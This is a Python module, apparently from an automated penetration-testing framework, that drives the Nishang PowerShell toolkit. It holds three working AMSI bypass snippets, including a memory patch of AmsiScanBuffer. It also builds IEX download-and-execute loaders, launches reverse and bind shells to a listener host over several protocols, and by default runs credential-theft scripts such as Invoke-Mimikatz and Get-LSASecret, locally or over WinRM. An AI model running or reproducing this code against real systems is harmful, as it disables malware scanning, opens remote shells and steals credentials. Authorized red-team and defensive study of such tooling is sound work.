"""
PowerShell Arsenal Script Execution Engine

Handles execution of PowerShell scripts with support for:
- Local script loading from cloned repository
- Remote IEX loading from GitHub
- WinRM remote execution to Windows targets
- AMSI bypass integration

Usage:
    from aipt_v2.tools.ps_arsenal import PSArsenalExecutor

    executor = PSArsenalExecutor(scripts_path="/tmp/ps_arsenal")
    result = await executor.execute_script(
        category="Gather",
        script_name="Get-Information",
        function_name="Get-Information"
    )
"""

import logging
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from aipt_v2.tools.ps_arsenal.ps_config import PSArsenalConfig, PSLoadMode
from aipt_v2.tools.ps_arsenal.ps_metadata import get_script_metadata
from aipt_v2.tools.winpwn.powershell_executor import (
    PowerShellExecutor,
    PowerShellResult,
    WinRMExecutor,
)

logger = logging.getLogger(__name__)


# =============================================================================
# AMSI BYPASS TECHNIQUES
# =============================================================================

AMSI_BYPASS_TECHNIQUES = {
    "reflection": """
# AMSI bypass - reflection technique
try {
    $a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
    $b = $a.GetFields('NonPublic,Static') | ? {$_.Name -like "*Context"}
    [IntPtr]$ptr = $b.GetValue($null)
    [Int32[]]$buf = @(0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
} catch {}
""",
    "memory_patch": """
# AMSI bypass - memory patch technique
try {
    $Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    Add-Type $Win32
    $LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
    $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
    $p = 0
    [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
    $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
} catch {}
""",
    "string_concat": """
# AMSI bypass - string concatenation technique
try {
    $a = 'System.Management.Automation.A';$b = 'msiUtils'
    $c = [Ref].Assembly.GetType($a+$b)
    $d = $c.GetField('amsiInitFailed','NonPublic,Static')
    $d.SetValue($null,$true)
} catch {}
""",
}


# =============================================================================
# CUSTOM EXCEPTIONS
# =============================================================================


class PSExecutionError(Exception):
    """Base exception for PowerShell execution errors."""

    pass


class ScriptNotFoundError(PSExecutionError):
    """Script file not found."""

    pass


class AMSIBlockedError(PSExecutionError):
    """Script blocked by AMSI."""

    pass


class PrivilegeError(PSExecutionError):
    """Insufficient privileges."""

    pass


class WinRMConnectionError(PSExecutionError):
    """WinRM connection failed."""

    pass


# =============================================================================
# POWERSHELL ARSENAL EXECUTOR
# =============================================================================


class PSArsenalExecutor:
    """
    PowerShell Arsenal execution engine.

    Supports:
    - Local script loading from disk
    - Remote IEX download pattern
    - WinRM remote execution
    - AMSI bypass integration
    - Script parameter handling
    """

    def __init__(
        self,
        scripts_path: Optional[str] = None,
        base_url: str = "https://raw.githubusercontent.com/samratashok/nishang/master",
        load_mode: PSLoadMode = PSLoadMode.LOCAL_FILE,
        bypass_amsi: bool = True,
        amsi_technique: str = "reflection",
        winrm_executor: Optional[WinRMExecutor] = None,
        config: Optional[PSArsenalConfig] = None,
    ):
        """
        Initialize PowerShell Arsenal executor.

        Args:
            scripts_path: Path to local script clone
            base_url: GitHub raw URL for remote loading
            load_mode: How to load scripts (local, remote, embedded)
            bypass_amsi: Attempt AMSI bypass before execution
            amsi_technique: Which AMSI bypass technique to use
            winrm_executor: Optional WinRM executor for remote execution
            config: Optional PSArsenalConfig to use
        """
        if config:
            self.scripts_path = Path(config.scripts_path) if config.scripts_path else None
            self.base_url = config.base_url
            self.load_mode = config.load_mode
            self.bypass_amsi = config.bypass_amsi
            self.amsi_technique = config.amsi_technique
        else:
            self.scripts_path = Path(scripts_path) if scripts_path else None
            self.base_url = base_url
            self.load_mode = load_mode
            self.bypass_amsi = bypass_amsi
            self.amsi_technique = amsi_technique

        self.winrm_executor = winrm_executor
        self._ps_executor = PowerShellExecutor(use_pwsh_core=False, execution_policy="Bypass")
        self._loaded_scripts: Dict[str, str] = {}
        self._execution_history: List[Dict[str, Any]] = []

    def _get_script_path(self, category: str, script_name: str) -> Path:
        """Get local path to a PowerShell script."""
        if not self.scripts_path:
            raise ScriptNotFoundError("scripts_path not configured for local loading")

        if not script_name.endswith(".ps1"):
            script_name = f"{script_name}.ps1"

        return self.scripts_path / category / script_name

    def _get_script_url(self, category: str, script_name: str) -> str:
        """Get remote URL for a PowerShell script."""
        if not script_name.endswith(".ps1"):
            script_name = f"{script_name}.ps1"
        return f"{self.base_url}/{category}/{script_name}"

    def _build_loader_command(self, category: str, script_name: str) -> str:
        """Build PowerShell command to load a script."""
        if self.load_mode == PSLoadMode.LOCAL_FILE:
            script_path = self._get_script_path(category, script_name)
            if not script_path.exists():
                raise ScriptNotFoundError(f"Script not found: {script_path}")
            return f". '{script_path}'"

        elif self.load_mode == PSLoadMode.REMOTE_IEX:
            url = self._get_script_url(category, script_name)
            return f"IEX (New-Object Net.WebClient).DownloadString('{url}')"

        elif self.load_mode == PSLoadMode.EMBEDDED:
            key = f"{category}/{script_name}"
            if key in self._loaded_scripts:
                return self._loaded_scripts[key]
            raise ScriptNotFoundError(f"Script not cached: {key}")

        return ""

    def _get_amsi_bypass(self, technique: Optional[str] = None) -> str:
        """Get AMSI bypass code by technique name."""
        tech = technique or self.amsi_technique
        return AMSI_BYPASS_TECHNIQUES.get(tech, AMSI_BYPASS_TECHNIQUES["reflection"])

    def _build_function_call(
        self, function_name: str, parameters: Optional[Dict[str, Any]] = None
    ) -> str:
        """Build PowerShell function call with parameters."""
        if not parameters:
            return function_name

        param_parts = []
        for key, value in parameters.items():
            if value is None:
                continue
            if isinstance(value, bool):
                if value:
                    param_parts.append(f"-{key}")
            elif isinstance(value, str):
                # Escape single quotes in string values
                escaped_value = value.replace("'", "''")
                param_parts.append(f"-{key} '{escaped_value}'")
            elif isinstance(value, (int, float)):
                param_parts.append(f"-{key} {value}")
            elif isinstance(value, list):
                # Handle arrays
                items = ",".join(f"'{str(v)}'" for v in value)
                param_parts.append(f"-{key} @({items})")

        if param_parts:
            return f"{function_name} {' '.join(param_parts)}"
        return function_name

    async def execute_script(
        self,
        category: str,
        script_name: str,
        function_name: str,
        parameters: Optional[Dict[str, Any]] = None,
        timeout: int = 300,
        env: Optional[Dict[str, str]] = None,
    ) -> PowerShellResult:
        """
        Execute a PowerShell script function.

        Args:
            category: Script category (Gather, Shells, etc.)
            script_name: Script filename without .ps1
            function_name: Function to call after loading
            parameters: Parameters to pass to the function
            timeout: Execution timeout in seconds
            env: Additional environment variables

        Returns:
            PowerShellResult with output
        """
        start_time = datetime.now(timezone.utc)

        # Build complete command
        parts = []

        # AMSI bypass if enabled
        if self.bypass_amsi:
            parts.append(self._get_amsi_bypass())

        # Load script
        try:
            loader = self._build_loader_command(category, script_name)
            parts.append(loader)
        except ScriptNotFoundError as e:
            return PowerShellResult(
                success=False,
                exit_code=-1,
                stdout="",
                stderr=str(e),
                execution_time=0,
                command="",
                metadata={"error": "script_not_found"},
            )

        # Build function call with parameters
        func_call = self._build_function_call(function_name, parameters)
        parts.append(func_call)

        command = "\n".join(parts)

        # Execute locally or remotely
        if self.winrm_executor:
            result = await self.winrm_executor.execute_command(command, timeout=timeout)
        else:
            result = await self._ps_executor.execute_command(command, timeout=timeout, env=env)

        # Check for AMSI block
        amsi_indicators = [
            "This script contains malicious content",
            "AMSI blocked",
            "ScriptContainedMaliciousContent",
        ]
        if any(ind in result.stderr for ind in amsi_indicators):
            result.metadata["amsi_blocked"] = True

        # Check for privilege errors
        priv_indicators = ["Access is denied", "requires elevation", "Administrator privileges"]
        if any(ind in result.stderr for ind in priv_indicators):
            result.metadata["privilege_error"] = True

        # Record execution
        self._execution_history.append(
            {
                "timestamp": start_time.isoformat(),
                "category": category,
                "script": script_name,
                "function": function_name,
                "success": result.success,
                "execution_time": result.execution_time,
            }
        )

        return result

    async def execute_by_name(
        self, script_name: str, parameters: Optional[Dict[str, Any]] = None, timeout: int = 300
    ) -> PowerShellResult:
        """
        Execute a script by name using metadata lookup.

        Args:
            script_name: Name of the script (e.g., "Invoke-Mimikatz")
            parameters: Parameters to pass
            timeout: Execution timeout

        Returns:
            PowerShellResult with output
        """
        metadata = get_script_metadata(script_name)
        if not metadata:
            return PowerShellResult(
                success=False,
                exit_code=-1,
                stdout="",
                stderr=f"Unknown script: {script_name}",
                execution_time=0,
                command="",
            )

        return await self.execute_script(
            category=metadata.category.value,
            script_name=metadata.name,
            function_name=metadata.function_name,
            parameters=parameters,
            timeout=timeout,
        )

    async def execute_shell(
        self, shell_type: str, lhost: str, lport: int, reverse: bool = True, timeout: int = 60
    ) -> PowerShellResult:
        """
        Execute a PowerShell shell script.

        Args:
            shell_type: Shell type (tcp, udp, icmp, http, https, wmi)
            lhost: Listener IP address
            lport: Listener port
            reverse: Use reverse shell (vs bind)
            timeout: Connection timeout

        Returns:
            PowerShellResult (may not return if shell connects)
        """
        shell_map = {
            "tcp": ("Shells", "Invoke-PowerShellTcp", "Invoke-PowerShellTcp"),
            "udp": ("Shells", "Invoke-PowerShellUdp", "Invoke-PowerShellUdp"),
            "icmp": ("Shells", "Invoke-PowerShellIcmp", "Invoke-PowerShellIcmp"),
            "http": ("Shells", "Invoke-PoshRatHttp", "Invoke-PoshRatHttp"),
            "https": ("Shells", "Invoke-PoshRatHttps", "Invoke-PoshRatHttps"),
            "wmi": ("Shells", "Invoke-PowerShellWmi", "Invoke-PowerShellWmi"),
            "conpty": ("Shells", "Invoke-ConPtyShell", "Invoke-ConPtyShell"),
        }

        shell_lower = shell_type.lower()
        if shell_lower not in shell_map:
            return PowerShellResult(
                success=False,
                exit_code=-1,
                stdout="",
                stderr=f"Unknown shell type: {shell_type}. Valid: {', '.join(shell_map.keys())}",
                execution_time=0,
                command="",
            )

        category, script_name, function_name = shell_map[shell_lower]

        # Build parameters based on shell type
        params: Dict[str, Any] = {}

        if shell_lower in ["tcp", "udp"]:
            params["IPAddress"] = lhost
            params["Port"] = lport
            if reverse:
                params["Reverse"] = True
            else:
                params["Bind"] = True

        elif shell_lower == "icmp":
            params["IPAddress"] = lhost
            params["Delay"] = 5
            params["BufferSize"] = 128

        elif shell_lower in ["http", "https"]:
            params["IPAddress"] = lhost
            params["Port"] = lport

        elif shell_lower == "conpty":
            params["RemoteIp"] = lhost
            params["RemotePort"] = lport
            params["Rows"] = 24
            params["Cols"] = 80

        elif shell_lower == "wmi":
            params["IPAddress"] = lhost

        return await self.execute_script(
            category, script_name, function_name, parameters=params, timeout=timeout
        )

    async def gather_credentials(
        self, scripts: Optional[List[str]] = None, timeout: int = 300
    ) -> Dict[str, PowerShellResult]:
        """
        Run credential gathering scripts.

        Args:
            scripts: Specific scripts to run (default: common cred scripts)
            timeout: Per-script timeout

        Returns:
            Dict mapping script name to result
        """
        if scripts is None:
            scripts = [
                "Invoke-Mimikatz",
                "Get-PassHashes",
                "Get-WLAN-Keys",
                "Get-WebCredentials",
                "Get-LSASecret",
            ]

        results = {}
        for script_name in scripts:
            result = await self.execute_by_name(script_name, timeout=timeout)
            results[script_name] = result

        return results

    async def system_recon(self, timeout: int = 120) -> Dict[str, PowerShellResult]:
        """
        Run system reconnaissance scripts.

        Args:
            timeout: Per-script timeout

        Returns:
            Dict mapping script name to result
        """
        scripts = [
            "Get-Information",
            "Check-VM",
        ]

        results = {}
        for script_name in scripts:
            result = await self.execute_by_name(script_name, timeout=timeout)
            results[script_name] = result

        return results

    def get_execution_history(self) -> List[Dict[str, Any]]:
        """Get execution history."""
        return self._execution_history.copy()

    def clear_history(self) -> None:
        """Clear execution history."""
        self._execution_history.clear()

    async def cleanup(self) -> None:
        """Cleanup resources."""
        await self._ps_executor.cleanup()
        self._loaded_scripts.clear()


def create_executor_from_config(config: PSArsenalConfig) -> PSArsenalExecutor:
    """
    Create PSArsenalExecutor from configuration.

    Args:
        config: PSArsenalConfig instance

    Returns:
        Configured PSArsenalExecutor
    """
    winrm = None
    if config.use_winrm and config.credentials.has_credentials():
        winrm = WinRMExecutor(
            target=config.target_host,
            username=config.credentials.username,
            password=config.credentials.password,
            domain=config.credentials.domain,
            ssl=config.winrm_ssl,
            port=config.winrm_port,
        )

    return PSArsenalExecutor(
        scripts_path=config.scripts_path,
        base_url=config.base_url,
        load_mode=config.load_mode,
        bypass_amsi=config.bypass_amsi,
        amsi_technique=config.amsi_technique,
        winrm_executor=winrm,
    )


__all__ = [
    "PSArsenalExecutor",
    "PSExecutionError",
    "ScriptNotFoundError",
    "AMSIBlockedError",
    "PrivilegeError",
    "WinRMConnectionError",
    "AMSI_BYPASS_TECHNIQUES",
    "create_executor_from_config",
]
